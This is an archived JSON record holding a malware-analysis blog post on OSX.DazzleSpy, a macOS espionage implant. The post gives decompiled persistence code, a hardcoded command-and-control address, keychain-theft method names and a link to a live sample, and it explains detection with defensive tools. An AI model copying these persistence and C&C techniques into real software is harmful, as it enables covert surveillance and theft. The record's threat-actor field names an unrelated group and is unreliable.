{
    "id": "a09dd252-36e1-4eb4-9569-2952fa627a4a",
    "created_at": "2023-01-12T15:04:26.699132Z",
    "updated_at": "2025-03-27T02:16:26.475561Z",
    "deleted_at": null,
    "sha1_hash": "bc444a0761c8008341de5da83cc1daebe9d9c70a",
    "title": "2022-01-25 - Analyzing OSX.DazzleSpy",
    "authors": "",
    "file_creation_date": "2022-05-29T01:24:12Z",
    "file_modification_date": "2022-05-29T01:24:12Z",
    "file_size": 4598856,
    "plain_text": "# Objective-See's Blog\n\n**objective-see.com/blog/blog_0x6D.html**\n\nAnalyzing OSX.DazzleSpy\n\nA fully-featured cyber-espionage macOS implant\n\nby: Patrick Wardle / January 25, 2022\n\nüìù üëæ Want to play along?\n[I‚Äôve uploaded an OSX.DazzleSpy sample (password: infect3d) to our macOS malware](https://objective-see.com/downloads/malware/DazzleSpy.zip)\ncollection.\n\n...please don‚Äôt infect yourself!\n\n## Background\n\n[Recently (as in this morning), researchers Marc-Etienne M.L√©veill√© and](https://twitter.com/marc_etienne_) [Anton Cherepanov](https://twitter.com/cherepanov74)\nof ESET published an intriguing report titled, ‚ÄúWatering hole deploys new macOS malware,\nDazzleSpy, in Asia‚Äù:\n\nIn this excellent report, they detail both the exploit and macOS payload used to target prodemocracy users in Hong Kong:\n\n\n-----\n\n_[A] Hong Kong pro-democracy radio station website [was] compromised to serve a_\n_Safari exploit that installed cyberespionage malware on site visitors' Macs. Here we_\n_provide a breakdown of the WebKit exploit used to compromise Mac users and an_\n_analysis of the payload, which is a new malware family targeting macOS.\" -ESET_\n\nI was interested in digging a bit deeper into the macOS implant, as well as seeing how it\nstacked up against Objective-See‚Äôs [free open-source tools.](https://objective-see.com/products.html)\n\nüìö Interested in general Mac malware analysis techniques?\n\nYou're in luck, as I've written an entire (free)\nbook on this very topic:\n\n[The Art Of Mac Malware, Vol. 0x1: Analysis](https://taomm.org/)\n\n## Triage\n\nESET‚Äôs report provided a hash for the decrypted macOS implant, `OSX.DazzleSpy :`\n\n```\nEE0678E58868EBD6603CC2E06A134680D2012C1B\n\n```\n\nThey noted that this file is dropped by the Safari exploit (and persisted on disk as\n```\nsoftwareupdate ).\n\n```\n\n-----\n\nPopping over to VirusTotal, we can grab a copy of DazzleSpy:\n\nDazzleSpy ...on VirusTotal\nIt was first submitted to VirusTotal on `2022-01-26 and at that time, only detected by ESET.`\n\nUsing macOS‚Äô built-in `file utility, we can see that this item is a standard mach-O binary:`\n```\n% file DazzleSpy/softwareupdate \nsoftwareupdate: Mach-O 64-bit executable x86_64\n\n```\nAs its not compiled for arm64, it will not run natively on Apple‚Äôs new M1 chips. Of course,\nthanks to Rosetta2 (Apple‚Äôs intel -> arm ‚Äútranslator‚Äù), the malware will still likely run on such\nsystems.\n\n[Via WhatsYourSign, my open-source utility that displays code-signing information via the UI,](https://objective-see.com/products/whatsyoursign.html)\nwe can see that the malware is unsigned:\n\n\n-----\n\nDazzleSpy ...is unsigned\nThe ESET report, notes that the exploit will \"remove the com.apple.quarantineattribute from\nthe file [malware] to avoid [macOS] asking the user to confirm the launch of the unsigned\nexecutable\"\n\nNow let‚Äôs run the `strings utility to extracted any embedded (ASCII) strings:`\n\n\n-----\n\n```\n% strings DazzleSpy/softwareupdate\n...\nnetworksetup -listallhardwareports\n/Library/.local\ncsrutil status\nSystem Integrity Protection status: disabled.\nIOPlatformUUID\nIOPlatformSerialNumber\nProductVersion\nAsia/Shanghai\n...\n88.218.192.128:5633\n...\n%@/.local\n%@/softwareupdate\n%@/Library/LaunchAgents\n/com.apple.softwareupdate.plist\nlaunchctl unload %@\nRunAtLoad\nKeepAlive\ndumpKeychain\n.local/security/keystealDaemon\ndocx\nxltx\npptx\n...\npages\nnumbers\ntext\n%@/.local/SearchFiles\n+[Singleton installDaemon]\n-[Singleton shellClass]\n-[Singleton processClass]\n-[Singleton keychainClass]\n-[Singleton remoteDesktopClass]\n-[Singleton updateClass]\n-[Singleton fileClass]\n-[Singleton fileClassWriteData:]\n-[Singleton recoveryClass]\n/Users/wangping/pangu/create_source/poke/osxrk_commandLine/exec.m\n/Users/wangping/pangu/create_source/poke/osxrk_commandLine/exec.o\n...\n\n```\nThe output from `strings is rather telling and includes:`\n\n\n-----\n\nWhat appears to be survey API calls and strings: `listallhardwareports,`\n```\n   IOPlatformSerialNumber, etc.\n\n```\nAn embedded address, `88.218.192.128:5633 likely the malware‚Äôs C&C server.`\n\nStrings related to launch item persistence: `%@/Library/LaunchAgents,`\n```\n   /com.apple.softwareupdate.plist, RunAtLoad, etc.\n\n```\nStrings that appear to be related to dumping the user keychain, searching for files (via\nextension), etc. etc.\n\nObjective-C class and method names (such as a `Singleton class with references to`\nother interesting classes).\n\nPaths containing a user name, and perhaps the internal name of the malware\n( osxrk ).\n\nWe can also run macOS‚Äô `otool command with the` `-L flag to determine the dynamic`\nlibraries that DazzleSpy is linked against:\n```\n% otool -L DazzleSpy/softwareupdate\nsoftwareupdate:\n  /System/Library/Frameworks/VideoToolbox.framework/Versions/A/VideoToolbox\n  /System/Library/Frameworks/AVFoundation.framework/Versions/A/AVFoundation \n  /System/Library/Frameworks/IOKit.framework/Versions/A/IOKit\n  /System/Library/Frameworks/CoreWLAN.framework/Versions/A/CoreWLAN\n  ...\n  /System/Library/Frameworks/CFNetwork.framework/Versions/A/CFNetwork\n  /System/Library/Frameworks/CoreMedia.framework/Versions/A/CoreMedia \n  /System/Library/Frameworks/Security.framework/Versions/A/Security\n  /System/Library/Frameworks/CoreVideo.framework/Versions/A/CoreVideo\n\n```\nBased on the linked libraries, we can gain some likely insight into the malware‚Äôs capabilities.\nFor example, it links again the `AVFoundation framework to implement remote desktop`\n(RDP) capabilities.\n\nFinally, as we saw various Objective-C classes and methods names in the output from\n```\nstrings, lets run reconstruct these via class-dump. Abridged output is below:\n\n```\n\n-----\n\n```\n% class dump DazzleSpy/softwareupdate\n...\n@interface Exec : NSObject\n{\n}\n+ (id)doShellInCmd:(id)arg1;\n@end\n@interface Singleton : NSObject \n{\n  ...\n}\n+ (void)installDaemon;\n...\n@end\n@interface FileSearchClassObject : NSObject\n{\n  NSTask *_searchTask;\n  NSMutableString *_searchString;\n  NSDictionary *_searchDict;\n  ...\n}\n...\n- (void)searchFile:(id)arg1;\n...\n@end\n@interface RemoteDesktopClassObject : NSObject \n{\n  AVCaptureSession *captureSession;\n  AVCaptureConnection *connectionVideo;\n  H264EncodeTool *_h264Encoder;\n  MouseClassObject *_mouse;\n}\n...\n- (void)restartRDP;\n- (void)mouseEventDict:(id)arg1;\n- (void)stopRemoteDesktop;\n- (void)startRemoteDesktop:(CDUnknownBlockType)arg1;\n- (void)captureOutput:(id)arg1 didOutputSampleBuffer:(struct opaqueCMSampleBuffer\n*)arg2 fromConnection:(id)arg3;\n@end\n@interface KeychainClassObject : NSObject\n{\n}\n+ (void)unzipFile:(id)arg1 toPath:(id)arg2;\n- (id)getPasswordFromSecKeychainItemRef:(struct __SecKeychainItem *)arg1;\n- (id)getPass:(id)arg1 cmdTo:(id)arg2;\n\n```\n\n-----\n\n```\n...\n@end\n\n```\nSimply from these class and method names, we can gain significant insight into the\nmalware‚Äôs likely capabilities. Of course, we should confirm that the class/method names do\nindeed match their logic. For example, does the `installDaemon really persist the`\nmalware? ‚Ä¶let‚Äôs find out!\n\n## Persistence\n\nThe ESET researchers noted:\n\n\"In order to persist on the compromised device, the malware adds a Property List file ...\n_named com.apple.softwareupdate.plist to the LaunchAgents folder. The malware_\n_executable file is named softwareupdate and saved in the $HOME/.local/ folder.\" -_\nESET\n\nRecall that from the `strings output, we saw strings such as` `%@/Library/LaunchAgents`\nand `com.apple.softwareupdate.plist .`\n\nIn a disassembler, we find cross-references to these strings in the aforementioned\n```\ninstallDaemon method (of the class named Singleton ):\n 1/* @class Singleton */\n 2+(void)installDaemon {\n 3...\n 4\n 5rax = NSHomeDirectory();\n 6var_78 = [NSString stringWithFormat:@\"%@/Library/LaunchAgents\", rax];\n 7var_80 = [var_78 stringByAppendingFormat:@\"/com.apple.softwareupdate.plist\"];\n 8if ([var_70 fileExistsAtPath:var_78] == 0x0) {\n 9  [var_70 createDirectoryAtPath:var_78 withIntermediateDirectories:0x1 ...];\n10...\n11\n12var_90 = [[NSMutableDictionary alloc] init];\n13var_98 = [[NSMutableArray alloc] init];\n14[var_98 addObject:var_38];\n15[var_98 addObject:@\"1\"];\n16rax = @(YES);\n17[var_90 setObject:rax forKey:@\"RunAtLoad\"];\n18rax = @(YES);\n19[var_90 setObject:rax forKey:@\"KeepAlive\"];\n20rax = @(YES);\n21[var_90 setObject:rax forKey:@\"SuccessfulExit\"];\n22[var_90 setObject:@\"com.apple.softwareupdate\" forKey:@\"Label\"];\n23[var_90 setObject:var_98 forKey:@\"ProgramArguments\"];\n24\n25[var_90 writeToFile:var_80 atomically:0x0];\n\n```\n\n-----\n\nIn the above decompilation, we first see the malware build the path to a launch agent plist\n( ~/Library/LaunchAgents/com.apple.softwareupdate.plist ).\n\nThen, it initializes a dictionary for the launch agent plist, with various key value pairs\n( RunAtLoad, etc). Once initialized this dictionary is written out to the launch agent plist\n( com.apple.softwareupdate.plist ).\n\nWe can passively observe the malware (recall, named `softwareupdate ) dynamically`\n[creating this plist via a File Monitor:](https://objective-see.com/products/utilities.html#FileMonitor)\n```\n# FileMonitor.app/Contents/MacOS/FileMonitor -pretty\n...\n{\n \"event\" : \"ES_EVENT_TYPE_NOTIFY_CREATE\",\n \"file\" : {\n  \"destination\" :\n\"/Users/user/Library/LaunchAgents/com.apple.softwareupdate.plist\",\n  \"process\" : {\n   \"signing info (computed)\" : {\n    \"signatureStatus\" : -67062\n   },\n   \"uid\" : 501,\n   \"arguments\" : [\n    \"/Users/user/Desktop/softwareupdate\"\n   ],\n   \"path\" : \"/Users/user/Desktop/softwareupdate\",\n   \"pid\" : 1469\n  }\n }\n}\n\n```\nOnce the malware‚Äôs launch agent‚Äôs plist has been created, we can easily dump its contents:\n\n\n-----\n\n```\n% cat /Users/user/Library/LaunchAgents/com.apple.softwareupdate.plist\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<!DOCTYPE plist PUBLIC \"-//Apple//DTD PLIST 1.0//EN\"\n\"http://www.apple.com/DTDs/PropertyList-1.0.dtd\">\n<plist version=\"1.0\">\n<dict>\n  <key>KeepAlive</key>\n  <true/>\n  <key>Label</key>\n  <string>com.apple.softwareupdate</string>\n  <key>ProgramArguments</key>\n  <array>\n    <string>/Users/user/.local/softwareupdate</string>\n    <string>1</string>\n  </array>\n  <key>RunAtLoad</key>\n  <true/>\n  <key>SuccessfulExit</key>\n  <true/>\n</dict>\n</plist>\n\n```\nIn the `ProgramArguments key we can see the path to the persistent location of the`\nmalware: `~/.local/softwareupdate . Also, as the` `RunAtLoad key is set to` `true, the`\nmalware will be automatically restarted each time the user logs in. Persistence achieved!\n\n## C&C Communications and Capabilities\n\nThe ESET [report notes that the malware will connect to](https://www.welivesecurity.com/2022/01/25/watering-hole-deploys-new-macos-malware-dazzlespy-asia/) `88.218.192.128 on port` `5633 :`\n\n\"DazzleSpy connects to a hardcoded C&C server; the IP address and port found in the\n_sample we decrypted was 88.218.192[.]128:5633.\" -ESET_\n\nRecall that we saw this ip address/port in the output of `strings, meaning that it is directly`\nhardcoded into the malware. In a disassembler, we can see it is referenced in the malware‚Äôs\n```\nmain method:\n\n```\n\n-----\n\n```\n 1int _main(int arg0, int arg1) {\n 2  ...\n 3  commandAndControl = [[NSString alloc]\ninitWithUTF8String:\"88.218.192.128:5633\"];\n 4\n 5\n 6  singleton = [Singleton sharedInstance];\n 7      \n 8  var_40 = [commandAndControl componentsSeparatedByString:@\":\"];\n 9  if ([var_40 count] == 0x2) {\n10    ip = [var_40 objectAtIndexedSubscript:0x0];\n11    port = [var_40 objectAtIndexedSubscript:0x1];\n12  }\n13          \n14  [singleton setSocketHost:ip];\n15  [singleton setSocketPort:port];\n16\n17  ...\n\n```\nSpecifically the hardcoded ip address and port string is first split (on `: ), and then the ip`\naddress is passed to the `setSocketHost: method, while the port, to the`\n```\nsetSocketPort: method.\n\n```\nThe ESET [report also describes the tasking (remote) commands that DazzleSpy supports.](https://www.welivesecurity.com/2022/01/25/watering-hole-deploys-new-macos-malware-dazzlespy-asia/)\nThis includes everything you‚Äôd expect to find in a cyber-espionage implant, including\nsurveying the infected host, exfiltrating files, running commands, self-deletion.\n\nInterestingly, the malware (again, as noted by ESET), also supports more advanced features\nsuch as:\n\nThe ability to search for files (via regex?)\n\nThe ability to start fully interactive remote desktop (RDP) session\n\nThe ability to dump the keychain (on systems vulnerable to `CVE-2019-8526 ).`\n\nCVE-2019-8526 was found by Linus Henze, and presented at our very own #OBTS v2.0.\n\nSee:\n\n[KeySteal: A Vulnerability in Apple's Keychain](https://objectivebythesea.com/v2/talks/OBTS_v2_Henze.pdf)\nThe handling of remote commands (tasking) seems to be implemented in the\n```\nanalysisData: Socket: method. Here the malware looks for tasking commands from the\n\n```\ncommand and control server, and then acts upon them. For example, here‚Äôs the\ndecompilation of the `run command, which opens (‚Äúruns‚Äù) a specified file (‚Äúpath‚Äù) via its`\ndefault handler (via `NSWorkspace ‚Äôs‚Äô` `openFile API):`\n\n\n-----\n\n```\n1if (YES  [command isEqualToString:@ run ]) {\n2  path = [var_888 objectForKeyedSubscript:@\"path\"];\n3  ...\n4  [NSWorkspace.sharedWorkspace openFile:path];\n5}\nDazzleSpy vs. Objective-See\n\n```\nWhenever a new piece of malware is uncovered I like to see how Objective-See‚Äôs free opensource tools stack up.\n\nGood news (and no really no surprise) they are able to detect and thus thwart this new\nthreat, even with no a priori knowledge of it! üòç\n\nRecall that when the malware was uploaded to VirusTotal (by ESET?), ESET was the only\nAV engine to detect it!\n\nFirst, [BlockBlock detects the malware‚Äôs launch agent persistence](https://objective-see.com/products/blockblock.html)\n( com.apple.softwareupdate.plist ):\n\nBlockBlock alert\n[LuLu, our free, open-source firewall detects when the malware attempts to connect out to its](https://objective-see.com/products/lulu.html)\ncommand and control server ( 88.218.192.128 ) for tasking:\n\n\n-----\n\nLuLu alert\n[And if you‚Äôre worried that you are already infected, KnockKnock can uncover the malware‚Äôs](https://objective-see.com/products/knockknock.html)\npersistence (after the fact):\n\nKnockKnock detection\n\n## Conclusions\n\nIn this blog post, we dove into `OSX.DazzleSpy a rather feature complete cyber-espionage`\nmacOS implant (discovered by ESET).\n\n\n-----\n\nSpecifically we discussed:\n\nHow to triage the sample\nHow the malware persisted\nThe malware‚Äôs remote tasking/capabilities.\n\nFinally, we showed that if you were running Objective-See‚Äôs free macOS tools the malware\nwouldn‚Äôt have stood a chance! üòÅ\n\nMahalo again to Marc-Etienne and Anton for their excellent report! ÔøΩ\n\n## üíï Support Me:\n\n[Love these blog posts? You can support them via my Patreon page!](https://www.patreon.com/bePatron?c=701171)\n\nThis website uses cookies to improve your experience.\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2022/2022-01-25 - Analyzing OSX.DazzleSpy.pdf"
    ],
    "report_names": [
        "2022-01-25 - Analyzing OSX.DazzleSpy.pdf"
    ],
    "threat_actors": [
        {
            "id": "75108fc1-7f6a-450e-b024-10284f3f62bb",
            "created_at": "2024-11-01T02:00:52.756877Z",
            "updated_at": "2025-03-27T02:00:55.544216Z",
            "deleted_at": null,
            "main_name": "Play",
            "aliases": null,
            "source_name": "MITRE:Play",
            "tools": [
                "Nltest",
                "AdFind",
                "PsExec",
                "Wevtutil",
                "Cobalt Strike",
                "Playcrypt",
                "Mimikatz"
            ],
            "source_id": "MITRE",
            "reports": null
        }
    ],
    "ts_created_at": 1673535866,
    "ts_updated_at": 1743041786,
    "ts_creation_date": 1653787452,
    "ts_modification_date": 1653787452,
    "files": {
        "pdf": "https://archive.orkl.eu/bc444a0761c8008341de5da83cc1daebe9d9c70a.pdf",
        "text": "https://archive.orkl.eu/bc444a0761c8008341de5da83cc1daebe9d9c70a.txt",
        "img": "https://archive.orkl.eu/bc444a0761c8008341de5da83cc1daebe9d9c70a.jpg"
    }
}